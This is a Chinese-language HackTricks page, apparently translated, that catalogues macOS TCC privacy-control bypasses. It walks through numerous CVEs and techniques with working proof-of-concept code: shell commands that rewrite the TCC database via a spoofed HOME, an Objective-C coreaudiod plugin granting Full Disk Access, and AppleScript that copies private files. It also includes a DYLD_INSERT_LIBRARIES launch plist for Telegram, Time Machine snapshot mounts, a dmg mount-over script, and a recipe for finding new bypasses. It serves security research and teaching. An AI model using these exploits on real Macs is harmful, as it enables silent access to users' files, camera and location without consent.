# macOS TCC 绕过

{{#include ../../../../../banners/hacktricks-training.md}}

## 按功能分类

### 写入绕过

这并不是一种绕过方式，只是 TCC 的工作机制：**它不会防止写入**。如果 Terminal **没有权限读取用户的 Desktop，它仍然可以写入其中**：
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
**扩展属性 `com.apple.macl`** 会被添加到新的 **file**，以授予 **creators app** 读取该文件的权限。

### TCC ClickJacking

可以在 **TCC prompt 上方放置一个窗口**，让用户在未察觉的情况下**接受**该提示。你可以在 [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)** 中找到 PoC。**

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC Request by arbitrary name

攻击者可以在 **`Info.plist`** 中使用任意名称（例如 Finder、Google Chrome 等）**创建 apps**，并让其请求访问某些受 TCC 保护的位置。用户会认为是合法应用正在请求此访问权限。\
此外，还可以**从 Dock 中移除合法 app 并将伪造 app 放到其中**。这样，当用户点击伪造 app（它可以使用相同的图标）时，它就能调用合法 app、请求 TCC 权限并执行 malware，使用户相信是合法 app 请求了该访问权限。

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

更多信息和 PoC：


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

默认情况下，通过 **SSH 的访问曾经具有“Full Disk Access”**。要禁用此功能，需要将其列出但禁用（从列表中移除不会移除这些权限）：

![TCC Request by arbitrary name - SSH Bypass：默认情况下，通过 SSH 的访问曾经具有“Full Disk Access”。要禁用此功能，需要将其列出但禁用（从列表中移除不会...](<../../../../../images/image (1077).png>)

这里可以找到一些 **malwares 成功绕过此保护机制**的示例：

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

> [!CAUTION]
> 注意，现在要启用 SSH，必须具有 **Full Disk Access**

### Handle extensions - CVE-2022-26767

属性 **`com.apple.macl`** 会被赋予文件，以授予**某个 application 读取该文件的权限**。当用户将文件**拖放**到 app 上，或用户**双击**文件并使用**默认 application**打开它时，都会设置此属性。

因此，用户可能会**注册一个恶意 app** 来处理所有扩展名，并调用 Launch Services **打开**任意文件（这样恶意文件就会被授予读取该文件的权限）。

### iCloud

通过 entitlement **`com.apple.private.icloud-account-access`**，可以与 **`com.apple.iCloudHelper`** XPC service 通信，该服务会**提供 iCloud tokens**。

**iMovie** 和 **Garageband** 具有此 entitlement 以及其他允许执行相关操作的 entitlement。

有关利用该 entitlement **获取 iCloud tokens** 的 exploit 的更多**信息**，请查看演讲：[**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)

### kTCCServiceAppleEvents / Automation

具有 **`kTCCServiceAppleEvents`** 权限的 app 能够**控制其他 Apps**。这意味着它可能能够**滥用其他 Apps 获得的权限**。

有关 Apple Scripts 的更多信息，请查看：


{{#ref}}
macos-apple-scripts.md
{{#endref}}

例如，如果某个 App 对 **`iTerm`** 具有 **Automation permission**，在此示例中，**`Terminal`** 具有对 iTerm 的访问权限：

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Over iTerm

没有 FDA 的 Terminal 可以调用拥有 FDA 的 iTerm，并利用它执行操作：
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### 通过 Finder

或者，如果某个 App 通过 Finder 获得了访问权限，它可以执行类似这样的脚本：
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## 按 App 行为

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

用户态 **tccd daemon** 使用 **`HOME`** **env** 变量从以下位置访问 TCC 用户数据库：**`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

根据 [this Stack Exchange post](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)，并且由于 TCC daemon 通过 `launchd` 在当前用户的 domain 中运行，因此可以 **控制** 传递给它的**所有环境变量**。\
因此，**attacker 可以在** **`launchctl`** **中设置** **`$HOME` environment** 变量，使其指向一个**受控** **directory**，**restart** **TCC** daemon，然后**直接修改 TCC 数据库**，从而在完全不提示终端用户的情况下，为自己授予**所有可用的 TCC entitlement**。\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notes

Notes 可以访问受 TCC 保护的位置，但创建 note 时，note 会被**创建在非受保护的位置**。因此，你可以让 Notes 将受保护文件复制到一个 note 中（也就是复制到非受保护的位置），然后访问该文件：

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

二进制文件 `/usr/libexec/lsd` 通过库 `libsecurity_translocate` 获得了 entitlement `com.apple.private.nullfs_allow`，允许其创建 **nullfs** 挂载；同时还获得了带有 **`kTCCServiceSystemPolicyAllFiles`** 的 entitlement `com.apple.private.tcc.allow`，从而可以访问所有文件。

通过为 "Library" 添加 quarantine 属性、调用 **`com.apple.security.translocation`** XPC service，可以将 Library 映射到 **`$TMPDIR/AppTranslocation/d/d/Library`**，之后便可以**访问** Library 内的所有文档。

### CVE-2024-44131 - FileProvider symlink race

将文件操作交给**特权 helper**（这里是 **`fileproviderd`** / **`Files.app`**）的 App 会**代表用户**复制或移动项目，因此复制操作使用的是 helper 的权限，而不是调用者的权限。

Jamf Threat Labs 发现，操作前执行的 symlink 验证可以被**竞争**：攻击者不在**最后**一个路径组件（该组件会被检查）上放置 symlink，而是在复制已经开始后替换路径中的**中间**目录。随后，特权 helper 会跟随攻击者控制的链接，在**完全不会显示提示**的情况下读取或写入受 TCC 保护的位置。

路径中没有通过随机 UUID 进行保护的目录（例如 `~/Library/Mobile Documents/com~apple~CloudDocs`）是最容易攻击的目标，因为攻击者可以预测用于竞争的完整路径。

> [!TIP]
> 这是需要关注的通用模式：**任何会多次解析路径的特权进程**（check-then-use，或分别解析源路径和目标路径的 `rename()` / `copyfile()`）都可能通过替换路径中间的目录而遭受竞争。只有 `O_NOFOLLOW_ANY`、在已打开的目录 FD 上使用 `openat()`，或使用 `realpath()` 后重新验证，才能真正关闭这个窗口。

更多信息请参阅 [**Jamf Threat Labs 的 writeup**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)。

### SQLITE_SQLLOG_DIR

`libsqlite3` 可以通过 `SQLITE_ENABLE_SQLLOG` 构建，这会添加由环境变量驱动的 logging hook（[upstream `test_sqllog.c`](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)）：

- **`SQLITE_SQLLOG_DIR=path`** – 对于**每个被打开的 database**，都会将**database 文件的副本**以及 SQL statements 的 log 写入 `path`（该目录必须已经存在）。
- **`SQLITE_SQLLOG_REUSE_FILES=0`** – 每次打开或 attach DB 时都创建**全新的副本**，而不是复用已有副本。
- **`SQLITE_SQLLOG_CONDITIONAL`** – 仅当主 DB 旁边存在 `<database>-sqllog` 文件时，才记录该 connection。

如果你可以将此变量注入一个拥有 **FDA** 且会打开 SQLite databases 的进程，它就会将这些受保护的 databases **复制**到你控制的目录中。由于目标文件名源自攻击者控制的数据，在目标位置预先放置 symlink，就可以将同一 primitive 转化为使用目标进程权限进行的**任意文件写入**。

### **SQLITE_AUTO_TRACE**

如果设置了环境变量 **`SQLITE_AUTO_TRACE`**，库 **`libsqlite3.dylib`** 就会开始**记录**所有 SQL queries。许多应用使用了这个库，因此可以记录它们的全部 SQLite queries。

多个 Apple 应用使用这个库来访问受 TCC 保护的信息。
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### Hunting for env-var driven file writes

前两个条目都是同一种通用 technique 的实例，值得继续寻找更多案例：**加载到 TCC-privileged apps 中的 frameworks 通常会暴露 debug/logging environment variables，使进程在 caller-controlled path 创建文件**。

查找流程：

1. 选择一个具有 FDA 或其他高价值 TCC permission 的目标（`Music`、`TV`、`Terminal`、MDM agents 等），并列出它链接的 frameworks（`otool -L`、`vmmap`）。
2. 使用以下命令在这些 frameworks 中 grep `getenv` strings：`strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`。
3. 通过 `launchctl setenv NAME /path/you/control` 设置候选变量，启动 app，并使用 `fs_usage -w -f filesys <pid>` 或 `sudo fs_usage | grep <path>` 观察它在 filesystem 上的行为。
4. 如果进程在你的目录中**创建或重命名**文件，你就获得了一个 write primitive：将目标指向 symlink（或像上面的 CVE-2024-44131 一样对中间目录发起 race），把它重定向到 `~/Library/Application Support/com.apple.TCC/TCC.db`。

> [!TIP]
> 有两点会限制这种方法。第一，**对于 hardened-runtime binaries，`DYLD_*` variables 会被忽略**，除非 app 携带 [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables) entitlement（“一个 Boolean value，表示 app 是否可能受 dynamic linker environment variables 影响；你可以使用该变量向 app 的 process 注入 code”）——另请参见 [Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)。第二，Apple 会在 individual framework debug variables 被报告后移除它们，因此某个变量在一个 macOS release 上有效，通常在下一个 release 中就会消失。如果设置某个变量后 app 静默拒绝启动，应将该变量视为已被 filtered。

关于使用 linker variables 实现等效 trick，请参见 [macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md)。

### Apple Remote Desktop

作为 root，你可以启用此 service，此时 **ARD agent 将拥有 full disk access**，之后 user 便可滥用它来复制新的 **TCC user database**。

## By **NFSHomeDirectory**

TCC 使用 user 的 HOME folder 中的 database，控制对 user-specific resources 的访问，路径为 **$HOME/Library/Application Support/com.apple.TCC/TCC.db**。\
因此，如果 user 能够让 TCC 在 `$HOME` environment variable 指向**不同 folder**的情况下重启，便可以在 **/Library/Application Support/com.apple.TCC/TCC.db** 中创建新的 TCC database，并诱骗 TCC 向任意 app 授予任意 TCC permission。

> [!TIP]
> 注意，Apple 使用 user profile 中 **`NFSHomeDirectory`** attribute 保存的设置作为 **`$HOME`** 的值。因此，如果你 compromise 了一个具有修改该值权限（**`kTCCServiceSystemPolicySysAdminFiles`**）的 application，就可以利用此 option weaponize 一个 TCC bypass。

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**第一个 POC** 使用 [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) 和 [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) 修改 user 的 **HOME** folder。

1. 获取目标 app 的 _csreq_ blob。
2. 使用所需 access 和 _csreq_ blob 放置一个伪造的 _TCC.db_ file。
3. 使用 [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) 导出 user 的 Directory Services entry。
4. 修改 Directory Services entry，更改 user 的 home directory。
5. 使用 [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) 导入修改后的 Directory Services entry。
6. 停止 user 的 _tccd_ 并重启该 process。

第二个 POC 使用了 **`/usr/libexec/configd`**，它具有值为 `kTCCServiceSystemPolicySysAdminFiles` 的 `com.apple.private.tcc.allow`。\
由于可以使用 **`-t`** option 运行 **`configd`**，attacker 可以指定要**加载的 custom Bundle**。因此，该 exploit 使用 **`configd` code injection** **替换**了通过 **`dsexport`** 和 **`dsimport`** 更改 user home directory 的方法。

更多信息请查看 [**original report**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)。

## By process injection

有多种 technique 可以向 process 内部注入 code 并滥用其 TCC privileges：


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

此外，最常见的用于 bypass TCC 的 process injection 是通过 **plugins (load library)** 实现的。\
Plugins 是通常以 libraries 或 plist 形式存在的额外 code，会被 **main application 加载**，并在其 context 下执行。因此，如果 main application 能够访问 TCC restricted files（通过已授予的 permissions 或 entitlements），**custom code 也将拥有相同访问权限**。

### CVE-2020-27937 - Directory Utility

Application `/System/Library/CoreServices/Applications/Directory Utility.app` 具有 **`kTCCServiceSystemPolicySysAdminFiles`** entitlement，会加载扩展名为 **`.daplug`** 的 plugins，且**不具备 hardened** runtime。

为了 weaponize 此 CVE，需要先**更改** **`NFSHomeDirectory`**（滥用前述 entitlement），从而能够**接管 user 的 TCC database** 以 bypass TCC。

更多信息请查看 [**original report**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)。

### CVE-2020-29621 - Coreaudiod

Binary **`/usr/sbin/coreaudiod`** 具有 `com.apple.security.cs.disable-library-validation` 和 `com.apple.private.tcc.manager` entitlements。前者**允许 code injection**，后者授予它**管理 TCC 的权限**。

该 binary 允许从 folder `/Library/Audio/Plug-Ins/HAL` 加载 **third party plug-ins**。因此，可以使用以下 PoC **加载 plugin 并滥用 TCC permissions**：
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
更多信息请查看[**原始报告**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)。

### Device Abstraction Layer (DAL) Plug-Ins

通过 Core Media I/O 打开 camera stream 的系统应用（具有 **`kTCCServiceCamera`** 的应用）会在进程中加载位于 `/Library/CoreMediaIO/Plug-Ins/DAL` 的这些插件（不受 SIP 限制）。

只需将包含通用 **constructor** 的 library 存放在其中，即可实现 **inject code**。

多个 Apple 应用容易受到此问题影响。

### Firefox

Firefox 应用具有 `com.apple.security.cs.disable-library-validation` 和 `com.apple.security.cs.allow-dyld-environment-variables` entitlements：
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
有关如何轻松利用此漏洞的更多信息，请参阅 [**原始报告**](https://wojciechregula.blog/post/how-to-rob-a-firefox/)。

### CVE-2020-10006

二进制文件 `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` 具有 **`com.apple.private.tcc.allow`** 和 **`com.apple.security.get-task-allow`** 这两个 entitlements，因此可以向进程内部注入代码并使用 TCC 权限。

### CVE-2023-26818 - Telegram

Telegram 具有 **`com.apple.security.cs.allow-dyld-environment-variables`** 和 **`com.apple.security.cs.disable-library-validation`** 这两个 entitlements，因此可以滥用它来 **获取其权限**，例如使用摄像头进行录制。你可以在 [**writeup 中找到 payload**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)。

请注意，为了使用 env variable 加载 library，创建了一个 **custom plist** 来注入该 library，并使用 **`launchctl`** 启动它：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## 通过 open 调用

即使处于 sandboxed 状态，也可以调用 **`open`**。

### Terminal Scripts

给终端授予 **Full Disk Access (FDA)** 是相当常见的，至少在技术人员使用的计算机上如此。也可以借助它调用 **`.terminal`** scripts。

**`.terminal`** scripts 是类似下面这样的 plist 文件，其中要执行的命令位于 **`CommandString`** key 中：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
应用程序可以在诸如 /tmp 的位置写入终端脚本，并使用如下命令启动它：
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## 通过挂载

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**任何用户**（甚至是无特权用户）都可以创建并挂载一个 Time Machine 快照，并访问该快照中的**所有文件**。\
唯一需要的**特权**是所使用的应用程序（例如 `Terminal`）拥有 **Full Disk Access**（FDA）权限（`kTCCServiceSystemPolicyAllfiles`），该权限需要由管理员授予。
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
更详细的解释可以[**在原始报告中找到**](https://theevilbit.github.io/posts/cve_2020_9771/)**。**

### CVE-2021-1784 & CVE-2021-30808 - 覆盖挂载 TCC 文件

即使 TCC DB 文件受到保护，也可以**在该目录上覆盖挂载**一个新的 TCC.db 文件：
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
Check the **full exploit** in the [**original writeup**](https://theevilbit.github.io/posts/cve-2021-30808/).

### CVE-2024-40855

如[original writeup](https://www.kandji.io/blog/macos-audit-story-part2)中所述，该 CVE 利用了 `diskarbitrationd`。

公共 `DiskArbitration` framework 中的 `DADiskMountWithArgumentsCommon` 函数负责执行安全检查。但是，可以通过直接调用 `diskarbitrationd` 绕过该检查，从而在路径中使用 `../` 元素和 symlink。

由于 `diskarbitrationd` 具有 `com.apple.private.security.storage-exempt.heritable` entitlement，攻击者可以在任意位置执行 mount，包括覆盖 TCC database。

### asr

工具 **`/usr/sbin/asr`** 可以复制整个磁盘，并将其 mount 到其他位置，从而绕过 TCC protections。

### Location Services

第三个 TCC database 位于 **`/var/db/locationd/clients.plist`**，用于标识允许**访问 location services** 的 clients。\
文件夹 **`/var/db/locationd/` 未受到 DMG mounting 的保护**，因此可以 mount 我们自己的 plist。

## By startup apps


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## By grep

在多种情况下，文件会在未受保护的位置存储敏感信息，例如 emails、phone numbers、messages...（这在 Apple 中会被视为 vulnerability）。

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

这现在已经不起作用了，但[**过去可以使用**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**：**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

另一种使用 [**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf) 的方法：

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## Reference

- [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [**20+ Ways to Bypass Your macOS Privacy Mechanisms**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [**Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms**](https://www.youtube.com/watch?v=a9hsxPdRxsY)
- [**Jamf Threat Labs - CVE-2024-44131: TCC bypass steals data from iCloud**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [**SQLite - `test_sqllog.c` (SQLITE_ENABLE_SQLLOG env variables)**](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
- [**Apple - Allow DYLD environment variables entitlement**](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
- [**The Eclectic Light Company - Notarization: the hardened runtime**](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)

{{#include ../../../../../banners/hacktricks-training.md}}
